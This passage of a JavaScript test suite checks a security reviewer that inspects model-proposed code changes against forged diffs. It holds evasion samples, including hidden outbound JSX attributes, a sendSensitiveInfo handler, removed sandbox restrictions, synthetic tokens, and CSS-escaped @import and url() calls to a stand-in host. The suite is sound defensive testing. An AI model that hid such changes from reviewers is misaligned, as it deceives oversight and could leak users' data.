    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
  });
  assert.equal(verdict.status, 'failed');
  assert.ok(verdict.findings.includes('New block-comment delimiters are not allowed in model changes'));
});


test('independent Security rejects provider-known opaque credentials even when reported diff omits them', () => {
  // All values are synthetic and must never be sent to an external service.
  const credentialLines = [
    'const status = "?access_token=' + 'a'.repeat(24) + '";',
    'const status = "#refresh_token=' + 'b'.repeat(24) + '";',
    'const status = "Authorization: Token ' + 'c'.repeat(24) + '";',
    'const status = "Authorization: Basic ' + 'd'.repeat(24) + '";',
    'const status = "postgresql://fixture:' + 'e'.repeat(24) + '@example.invalid/db";',
    'const status = {"session_token":"' + 'f'.repeat(24) + '"};'
  ];
  const omitted = '@@ -1 +1 @@\\n-const items = 1;\\n+const items = 2;\\n'.replaceAll('\\n', '\n');
  for (const line of credentialLines) {
    const candidate = 'const items = 2;\n' + line + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH], diff: omitted,
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed', line);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), line);
  }
  const safe = 'const items = 2; // Public documentation: https://example.invalid/manual\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH], diff: omitted,
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security rejects hidden outbound JSX attributes even with truncated diff', () => {
  const scenarios = [
    ['<img', 'alt="Decorative"', 'src={unsafeUrl}', '/>'],
    ['<a', 'title="Details"', 'href={unsafeUrl}', '>Help</a>'],
    ['<form', 'id="localForm"', 'action={unsafeUrl}', '>Text</form>']
  ];
  for (const [tag, marker, outbound, closing] of scenarios) {
    const before = ['const view = (' + tag, '  ' + marker, closing + ');', ''].join('\n');
    const after = ['const view = (' + tag, '  ' + marker, '  ' + outbound, closing + ');', ''].join('\n');
    const verdict = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      // Deliberately omit the outbound line, proving Security checks candidate bytes.
      diff: '@@ -1 +1 @@\n-const before = true;\n+const after = true;\n',
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(verdict.status, 'failed', outbound);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), outbound);
  }
  const before = ['const view = (<img', '  alt="Decorative"', '/>);', ''].join('\n');
  const after = before.replace('Decorative', 'Illustration');
  assert.equal(inspectModelDiff({
    original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  alt="Illustration"',
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
  }).status, 'passed');
});

test('independent Security counts repeated outbound tags despite a clean claimed diff', () => {
  const before = ["const view = (<>","  <img","    alt=\"Icon\"","    src={existingUrl}","  />","  <img","    alt=\"Icon\"","  />","</>);",""].join('\n');
  const after = before.replace('    alt="Icon"\n  />\n</>);',
    '    alt="Icon"\n    src={existingUrl}\n  />\n</>);');
  assert.notEqual(after, before);
  const verdict = inspectModelDiff({
    original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  alt="Icon"',
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
  });
  assert.equal(verdict.status, 'failed');
  assert.ok(verdict.findings.includes('Potentially unsafe new code'));
});

test('independent Security checks every outbound JSX prop and value on an existing tag', () => {
  const base = 'const view = (<img\n  src={safeUrl > cutoff ? safeUrl : fallback}\n  alt="Before > After"\n/>);\n';
  const changes = [
    ['  alt="Before > After"\n', '  alt="Before > After"\n  srcSet={untrustedUrl}\n'],
    ['  src={safeUrl > cutoff ? safeUrl : fallback}\n',
      '  src={untrustedUrl > cutoff ? safeUrl : fallback}\n'],
    ['  alt="Before > After"\n', '  alt="Before > After"\n  {...untrustedProps}\n'],
    ['  alt="Before > After"\n', '  alt="Before > After"\n  src={safeUrl}\n']
  ];
  for (const [find, replace] of changes) {
    const candidate = base.replace(find, replace);
    assert.notEqual(candidate, base);
    const verdict = inspectModelDiff({
      original: base, actual: candidate,
      changedPaths: [MODEL_ALLOWED_PATH],
      // Deliberately hide the added attribute to exercise committed candidate inspection.
      diff: '+  alt="Before > After"',
      report: { status: 'proposed', sourceHash: hash(base),
        proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed', replace);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), replace);
  }
  const safe = base.replace('alt="Before > After"', 'alt="Updated description"');
  assert.equal(inspectModelDiff({
    original: base, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  alt="Updated description"',
    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(safe) }
  }).status, 'passed', 'unchanged src with a harmless alt change is accepted');
});

test('independent Security rejects SVG and custom JSX outbound references with forged clean diff', () => {
  const scenarios = [
    ['textPath', 'data-label="Path label"', 'href={remotePath}'],
    ['animate', 'attributeName="opacity"', 'href={remoteTarget}'],
    ['linearGradient', 'id="brandGradient"', 'xlinkHref={remoteGradient}'],
    ['BrandImage', 'alt="Preview"', 'src={remoteAsset}']
  ];
  for (const [tag, inert, outbound] of scenarios) {
    const before = ['const view = (<'+tag, '  '+inert, '/>);', ''].join('\n');
    const after = before.replace('  '+inert+'\n', '  '+inert+'\n  '+outbound+'\n');
    assert.notEqual(after, before);
    const verdict = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      // Intentionally omit the added URL property from the claimed diff.
      diff: '+  ' + inert,
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(verdict.status, 'failed', tag + ' ' + outbound);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const base = 'const view = (<textPath\n  href={approvedLocalPath}\n  aria-label="Old label"\n/>);\n';
  const safe = base.replace('Old label', 'New label');
  assert.equal(inspectModelDiff({
    original: base, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  aria-label="New label"',
    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(safe) }
  }).status, 'passed');
  const changedHref = base.replace('approvedLocalPath', 'untrustedRemotePath');
  const rejected = inspectModelDiff({
    original: base, actual: changedHref, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  aria-label="Old label"',
    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(changedHref) }
  });
  assert.equal(rejected.status, 'failed');
  assert.ok(rejected.findings.includes('Potentially unsafe new code'));
});

test('independent Security catches custom-element outbound attributes despite omitted Git additions', () => {
  const scenarios = [
    ['asset-viewer', 'title="Preview"', 'src={remoteAsset}'],
    ['file-preview', 'aria-label="Preview"', 'href={remoteDocument}'],
    ['svg:customPath', 'data-label="Route"', 'xlinkHref={remotePath}'],
    ['asset-viewer', 'title="Preview"', '{...externalProps}']
  ];
  for (const [tag, inert, outbound] of scenarios) {
    const before = ['const view = (<'+tag, '  '+inert, '/>);', ''].join('\n');
    const after = before.replace('  '+inert+'\n', '  '+inert+'\n  '+outbound+'\n');
    assert.notEqual(after, before);
    const verdict = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  ' + inert, // forged incomplete diff deliberately omits the new sink
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(verdict.status, 'failed', tag + ' ' + outbound);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const before = 'const view = (<asset-viewer\n  src={approvedAsset}\n  title="Old copy"\n/>);\n';
  const safe = before.replace('Old copy', 'New copy');
  assert.equal(inspectModelDiff({
    original: before, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  title="New copy"',
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(safe) }
  }).status, 'failed');
  const changed = before.replace('approvedAsset', 'untrustedRemoteAsset');
  const swapped = inspectModelDiff({
    original: before, actual: changed, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  title="Old copy"', // omit the actual URL change
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(changed) }
  });
  assert.equal(swapped.status, 'failed');
  assert.ok(swapped.findings.includes('Potentially unsafe new code'));
});


test('independent Security rejects SVG xmlBase source changes with forged incomplete diff', () => {
  for (const [tag, attribute] of [
    ['svg', 'xmlBase'], ['g', 'xml:base'],
    ['path', 'xmlBase'], ['symbol', 'xml:base']
  ]) {
    const before = 'const icon = (<'+tag+'\n  aria-label="Local icon"\n/>);\n';
    const after = before.replace('  aria-label="Local icon"\n',
      '  aria-label="Local icon"\n  ' + attribute + '={untrustedBaseUri}\n');
    assert.notEqual(before, after);
    const verdict = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  aria-label="Local icon"', // Omits the new XML base on purpose
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(verdict.status, 'failed', tag + ' ' + attribute);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const before = 'const icon = (<svg\n  xmlBase={approvedBase}\n  aria-label="Old name"\n/>);\n';
  const safe = before.replace('Old name', 'New name');
  assert.equal(inspectModelDiff({
    original: before, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  aria-label="New name"',
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(safe) }
  }).status, 'passed');
  const changed = before.replace('approvedBase', 'untrustedBaseUri');
  const verdict = inspectModelDiff({
    original: before, actual: changed, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  aria-label="Old name"', // Omit the actual URL-base replacement
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(changed) }
  });
  assert.equal(verdict.status, 'failed');
  assert.ok(verdict.findings.includes('Potentially unsafe new code'));
});

test('independent Security compares ping and attributionSrc even with forged clean diff', () => {
  for (const [tag, prop] of [
    ['a', 'ping'], ['a', 'attributionSrc'],
    ['img', 'attributionsrc'], ['asset-viewer', 'ping']
  ]) {
    const before = 'const view = (<'+tag+'\n  aria-label="Public description"\n/>);\n';
    const after = before.replace('  aria-label="Public description"\n',
      '  aria-label="Public description"\n  ' + prop + '={untrustedRemoteEndpoint}\n');
    const result = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  aria-label="Public description"', // deliberately omits new outbound URL
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(result.status, 'failed', tag + ' ' + prop);
    assert.ok(result.findings.includes('Potentially unsafe new code'));
  }
  const before = 'const view = (<a\n  ping={approvedEndpoint}\n  aria-label="Old label"\n/>);\n';
  const safe = before.replace('Old label', 'New label');
  assert.equal(inspectModelDiff({
    original: before, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  aria-label="New label"',
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(safe) }
  }).status, 'passed', 'inert UI text edit should pass');
  const changed = before.replace('approvedEndpoint', 'untrustedRemoteEndpoint');
  const result = inspectModelDiff({
    original: before, actual: changed, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  aria-label="Old label"', // omit actual URL value swap
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(changed) }
  });
  assert.equal(result.status, 'failed');
  assert.ok(result.findings.includes('Potentially unsafe new code'));
});


test('independent Security refuses newly wired JSX effects despite an incomplete Git diff', () => {
  for (const [tag, prop] of [
    ['div', 'onMouseEnter={sendSensitiveInfo}'],
    ['span', 'style={untrustedRemoteStyle}'],
    ['section', 'onClick={existingSideEffect}'],
    ['label', 'onFocus={existingSideEffect}']
  ]) {
    const before = 'const view = (<'+tag+'\n  aria-label="Preview"\n/>);\n';
    const after = before.replace('  aria-label="Preview"\n',
      '  aria-label="Preview"\n  '+prop+'\n');
    const result = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  aria-label="Preview"', // deliberately omits the actual effect
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(result.status, 'failed', tag + ' ' + prop);
    assert.ok(result.findings.includes('Potentially unsafe new code'), prop);
  }
  const before = 'const view = (<div\n  style={approvedStyle}\n  aria-label="Old label"\n/>);\n';
  for (const [oldValue, newValue] of [
    ['approvedStyle', 'untrustedStyle'], ['Old label', 'New label']
  ]) {
    const after = before.replace(oldValue, newValue);
    const result = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  aria-label="Old label"',
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(result.status, oldValue === 'approvedStyle' ? 'failed' : 'passed');
  }
  const hasEvent = 'const view = (<div\n  onClick={approvedHandler}\n  aria-label="Old label"\n/>);\n';
  const changed = hasEvent.replace('approvedHandler', 'otherExistingHandler');
  const verdict = inspectModelDiff({
    original: hasEvent, actual: changed, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  aria-label="Old label"',
    report: { status: 'proposed', sourceHash: hash(hasEvent), proposedHash: hash(changed) }
  });
  assert.equal(verdict.status, 'failed');
  assert.ok(verdict.findings.includes('Potentially unsafe new code'));
});


test('independent Security rejects intrinsic callback refs and effects with forged Git diff', () => {
  for (const [tag, prop] of [
    ['p', 'ref={existingCallback}'],
    ['pre', 'onMouseEnter={existingSideEffect}'],
    ['nav', 'onClick={existingSideEffect}'],
    ['details', 'onToggle={existingSideEffect}'],
    ['summary', 'onClick={existingSideEffect}'],
    ['dialog', 'onClose={existingSideEffect}'],
    ['textarea', 'onChange={existingSideEffect}'],
    ['select', 'onChange={existingSideEffect}'],
    ['option', 'onMouseOver={existingSideEffect}'],
    ['figure', 'style={existingRemoteStyle}'],
    ['figcaption', 'ref={existingCallback}']
  ]) {
    const before = 'const view = (<'+tag+'\n  aria-label="Old caption"\n/>);\n';
    const after = before.replace('  aria-label="Old caption"\n',
      '  aria-label="Old caption"\n  '+prop+'\n');
    const verdict = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  aria-label="Old caption"', // forged: omits the actual effect
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(verdict.status, 'failed', tag + ': ' + prop);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const before = 'const view = (<p\n  ref={approvedCallback}\n  aria-label="Old caption"\n/>);\n';
  for (const [oldValue, newValue, expected] of [
    ['approvedCallback', 'anotherCallback', 'failed'],
    ['Old caption', 'New caption', 'passed']
  ]) {
    const after = before.replace(oldValue, newValue);
    const verdict = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  aria-label="Old caption"', // source verification must prevail
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(verdict.status, expected);
    if (expected === 'failed') assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
});

test('independent Security freezes unknown and boolean JSX effects with forged Git diff', () => {
  for (const [tag, prop] of [
    ['button', 'type="submit"'],
    ['form', 'method="post"'],
    ['form', 'noValidate'],
    ['input', 'autoFocus'],
    ['input', 'disabled'],
    ['input', 'formMethod="post"'],
    ['a', 'target="_blank"'],
    ['a', 'rel="opener"'],
    ['iframe', 'sandbox="allow-scripts"'],
    ['meta', 'httpEquiv="refresh"'],
    ['asset-viewer', 'customHandler={existingCallback}'],
    ['p', 'aria-label={existingSideEffect()}']
  ]) {
    const before = 'const view = (<'+tag+'\n  title="Old copy"\n/>);\n';
    const after = before.replace('  title="Old copy"\n',
      '  title="Old copy"\n  '+prop+'\n');
    const result = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  title="Old copy"', // forged: omits the actual effect
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(result.status, 'failed', tag + ': ' + prop);
    assert.ok(result.findings.includes('Potentially unsafe new code'));
  }
  const before = 'const view = (<button\n  type="button"\n  title="Old copy"\n/>);\n';
  for (const [find, replace, expected] of [
    ['type="button"', 'type="submit"', 'failed'],
    ['Old copy', 'New copy', 'passed']
  ]) {
    const after = before.replace(find, replace);
    const result = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  title="Old copy"',
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(result.status, expected);
  }
});

test('independent Security freezes arbitrary JSX boolean props even with forged diff', () => {
  for (const [tag, attribute] of [
    ['input', 'capture'], ['audio', 'autoPlay'], ['button', 'popover'],
    ['iframe', 'allowPaymentRequest'], ['asset-viewer', 'customFlag'],
    ['p', 'translate'], ['input', 'enterKeyHint']
  ]) {
    const before = 'const view = (<'+tag+'\n  title="Old copy"\n/>);\n';
    const after = before.replace('  title="Old copy"\n',
      '  title="Old copy"\n  ' + attribute + '\n');
    const verdict = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  title="Old copy"', // deliberately hides the boolean addition
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(verdict.status, 'failed', tag + ' ' + attribute);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
});

test('independent Security accepts copy containing prop-shaped literal text', () => {
  const before = 'const view = (<div\n  title="Safe label with customFlag=off"\n  aria-label="Old caption"\n/>);\n';
  const after = before.replace('Old caption', 'New caption');
  const verdict = inspectModelDiff({
    original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+  aria-label="New caption"',
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
  });
  assert.equal(verdict.status, 'passed');
});

test('independent Security rejects removed JSX restrictions even when a supplied diff is forged', () => {
  for (const [tag, prop] of [
    ['iframe', 'sandbox="allow-scripts"'],
    ['iframe', 'referrerPolicy="no-referrer"'],
    ['button', 'disabled'],
    ['form', 'noValidate'],
    ['input', 'required']
  ]) {
    const before = 'const view = (<' + tag + '\n  ' + prop + '\n  title="Old copy"\n/>);\n';
    const after = before.replace('  ' + prop + '\n', '');
    const verdict = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  title="Old copy"', // deliberately omits security-attribute deletion
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(verdict.status, 'failed', tag + ' ' + prop);
  }
  const before = 'const view = (<iframe\n  sandbox="allow-scripts"\n/>);\n';
  const after = before.replace('<iframe\n  sandbox="allow-scripts"\n/>', '<p>Safe replacement</p>');
  assert.equal(inspectModelDiff({
    original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+<p>Safe replacement</p>',
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
  }).status, 'failed');
});

test('independent Security freezes lowercase JSX member props despite a forged diff', () => {
  for (const tag of ['ui.Button', 'widgets.Picture', 'helpers.$Panel']) {
    const before = 'const view = (<' + tag + '\n  disabled\n  title="Old copy"\n/>);\n';
    for (const after of [
      before.replace('  title="Old copy"\n',
        '  title="Old copy"\n  onClick={existingCallback}\n'),
      before.replace('  disabled\n', '')
    ]) {
      const verdict = inspectModelDiff({
        original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
        diff: '+  title="Old copy"', // forged: hides behavior modification
        report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
      });
      assert.equal(verdict.status, 'failed', tag);
      assert.ok(verdict.findings.includes('Potentially unsafe new code'), tag);
    }
    const safe = before.replace('Old copy', 'Updated copy');
    assert.equal(inspectModelDiff({
      original: before, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  title="Updated copy"',
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(safe) }
    }).status, 'failed', tag);
  }
});

test('independent Security freezes bare JSX tag changes despite a forged diff', () => {
  for (const [from, to] of [
    ['<div>Old copy</div>', '<form>Old copy</form>'],
    ['<p>Old copy</p>', '<iframe>Old copy</iframe>'],
    ['<button>Old copy</button>', '<div>Old copy</div>'],
    ['<div>Old copy</div>', '<div>Old copy</div><form>Send</form>']
  ]) {
    const before = 'const view = (' + from + ');\n';
    const after = before.replace(from, to);
    const verdict = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+  Old copy', // deliberately hides the JSX tag change
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(verdict.status, 'failed', from + ' -> ' + to);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const before = 'const view = (<p>Old copy</p>);\n';
  const after = before.replace('Old copy', 'New copy');
  assert.equal(inspectModelDiff({
    original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const view = (<p>New copy</p>);',
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
  }).status, 'passed');
});


test('independent Security freezes opaque component mount and quoted props despite forged diff', () => {
  for (const component of ['TelemetryWidget', 'ui.Telemetry', 'asset-viewer']) {
    const original = 'const view = (<div>Old copy</div>);\n';
    for (const replacement of [
      '<' + component + ' />',
      '<div>Old copy</div><' + component + ' />'
    ]) {
      const actual = original.replace('<div>Old copy</div>', replacement);
      const verdict = inspectModelDiff({
        original, actual, changedPaths: [MODEL_ALLOWED_PATH],
        diff: '+Old copy', // deliberately omits executable component insertion
        report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
      });
      assert.equal(verdict.status, 'failed', component + ' mount');
      assert.ok(verdict.findings.includes('Potentially unsafe new code'));
    }
    const before = 'const view = (<' + component + '\n  title="Old copy"\n/>);\n';
    const after = before.replace('Old copy', 'New copy');
    const verdict = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+New copy', // deliberately omits component prop change
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(verdict.status, 'failed', component + ' title');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const original = 'const view = (<div title="Old copy">Text</div>);\n';
  const actual = original.replace('Old copy', 'New copy');
  assert.equal(inspectModelDiff({
    original, actual, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const view = (<div title="New copy">Text</div>);',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
  }).status, 'passed');
});


test('independent Security rejects case-only React component and prop substitutions', () => {
  for (const [from, to] of [
    ['<AdminPanel />', '<ADMINPanel />'],
    ['<ui.AdminPanel />', '<ui.adminPanel />'],
    ['<AdminPanel mode="safe" />', '<AdminPanel Mode="safe" />']
  ]) {
    const original = 'const view = (' + from + ');\n';
    const actual = original.replace(from, to);
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+Old copy', // forged to omit the case-only JSX change
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', from + ' -> ' + to);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
});

test('independent Security freezes dollar and underscore JSX components despite forged diffs', () => {
  for (const component of ['$Telemetry', '_telemetry', 'Panel$', 'UI.$Panel', 'UI._Panel', '$ui.Widget']) {
    const original = 'const view = (<div>Old copy</div>);\n';
    const actual = original.replace('<div>Old copy</div>',
      '<div>Old copy</div><' + component + ' />');
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+Old copy', // deliberately omits the component mount
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', component + ' mount');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), component);

    const before = 'const view = (<' + component + '\n  title="Old label"\n/>);\n';
    for (const replacement of [
      '  title="New label"\n',
      '  title="Old label"\n  onClick={existingCallback}\n'
    ]) {
      const changed = before.replace('  title="Old label"\n', replacement);
      const reviewed = inspectModelDiff({
        original: before, actual: changed, changedPaths: [MODEL_ALLOWED_PATH],
        diff: '+Old label', // deliberately hides the real prop modification
        report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(changed) }
      });
      assert.equal(reviewed.status, 'failed', component + ' prop change');
      assert.ok(reviewed.findings.includes('Potentially unsafe new code'), component);
    }
  }

  const original = 'const view = (<p title="Old label">Text</p>);\n';
  const actual = original.replace('Old label', 'New label');
  assert.equal(inspectModelDiff({
    original, actual, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const view = (<p title="New label">Text</p>);',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
  }).status, 'passed');
});


test('independent Security rejects Unicode JSX mounts and prop edits even with forged diff', () => {
  for (const component of ['ÉWidget', '组件', 'AÉWidget', 'ui.ÉPanel', 'é-widget']) {
    const original = 'const view = (<div>Old copy</div>);\n';
    const actual = original.replace('</div>', '</div><' + component + ' />');
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+Old copy', // intentionally conceals the component mount
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', component + ' mount');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), component);

    const before = 'const view = (<' + component + ' title="Old copy" />);\n';
    const changed = before.replace('Old copy', 'New copy');
    const reviewed = inspectModelDiff({
      original: before, actual: changed, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+Old copy', // deliberately omits actual change to opaque prop
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(changed) }
    });
    assert.equal(reviewed.status, 'failed', component + ' prop change');
    assert.ok(reviewed.findings.includes('Potentially unsafe new code'), component);
  }

  const original = 'const view = (<p title="État">الحالة</p>);\n';
  const actual = original.replace('title="État"', 'title="Nouveau"');
  assert.equal(inspectModelDiff({
    original, actual, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const view = (<p title="Nouveau">الحالة</p>);',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
  }).status, 'passed');
});

test('independent Security rejects CSS escaped imports and new stylesheet tags despite forged diffs', () => {
  const escape = String.fromCharCode(92);
  const escapedImport = '@' + escape + '69mport "https://assets.invalid/theme.css";';
  for (const [before, after] of [
    ['const view = (<p>Old status copy</p>);\n',
      'const view = (<p>Old status copy</p><style>body { color: red; }</style>);\n'],
    ['const view = (<style>body { color: black; }</style>);\n',
      'const view = (<style>' + escapedImport + '</style>);\n']
  ]) {
    const verdict = inspectModelDiff({
      original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+Old status copy', // deliberately omits actual stylesheet delta
      report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
    });
    assert.equal(verdict.status, 'failed', 'stylesheet capability must not pass');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const before = 'const view = (<p>Old status copy</p>);\n';
  const after = before.replace('Old status copy', 'New status copy');
  assert.equal(inspectModelDiff({
    original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const view = (<p>New status copy</p>);',
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
  }).status, 'passed');
});


test('independent Security rejects CSS-escaped URL functions despite forged diff', () => {
  const escape = String.fromCharCode(92);
  const original = 'const view = (<style>body { background: none; }</style>);\n';
  const payloads = [
    'background: u' + escape + '72l(https://assets.invalid/pixel);',
    'background: ' + escape + '75rl(https://assets.invalid/pixel);',
    'background: u' + escape + 'rl(https://assets.invalid/pixel);'
  ];
  for (const replace of payloads) {
    const actual = original.replace('background: none;', replace);
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const unrelated = "harmless";', // forged delta omits the CSS
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', replace);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), replace);
  }
  const before = 'const view = (<p>Old status copy</p>);\n';
  const after = before.replace('Old status copy', 'New status copy');
  assert.equal(inspectModelDiff({
    original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const view = (<p>New status copy</p>);',
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
  }).status, 'passed');
});

test('independent Security rejects middle-of-identifier CSS import escapes despite forged diff', () => {
  const slash = String.fromCharCode(92);
  const original = 'const view = (<style>body { color: black; }</style>);\n';
  const attacks = [
    '@i' + slash + '6dport "https://assets.invalid/theme.css";',
    '@im' + slash + '70ort "https://assets.invalid/theme.css";',
    '@im' + slash + '000070ort "https://assets.invalid/theme.css";'
  ];
  for (const replacement of attacks) {
    const actual = original.replace('body { color: black; }', replacement);
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const unrelated = "harmless";', // forged: intentionally conceals the CSS at-rule
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', replacement);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), replacement);
  }
  const safeBefore = 'const view = (<p>Old status copy</p>);\n';
  const safeAfter = safeBefore.replace('Old status copy', 'New status copy');
  assert.equal(inspectModelDiff({
    original: safeBefore, actual: safeAfter, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const view = (<p>New status copy</p>);',
    report: { status: 'proposed', sourceHash: hash(safeBefore), proposedHash: hash(safeAfter) }
  }).status, 'passed');
});


